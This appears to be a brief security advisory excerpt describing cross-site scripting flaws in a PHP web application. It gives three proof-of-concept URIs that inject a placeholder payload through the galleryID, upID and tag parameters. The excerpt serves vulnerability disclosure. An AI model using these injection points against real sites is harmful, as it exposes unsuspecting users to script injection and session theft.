Attackers can exploit these issues by enticing an unsuspecting user to follow a malicious URI.

The following proof-of-concept URIs are available:

http://www.example.com/PATH/index.php?site=usergallery&amp;action=upload&amp;galleryID="&gt;your code
http://www.example.com/PATH/index.php?site=calendar&amp;action=announce&amp;upID="&gt;your code
http://www.example.com/PATH/index.php?site=calendar&amp;action=announce&amp;tag="&gt;your code
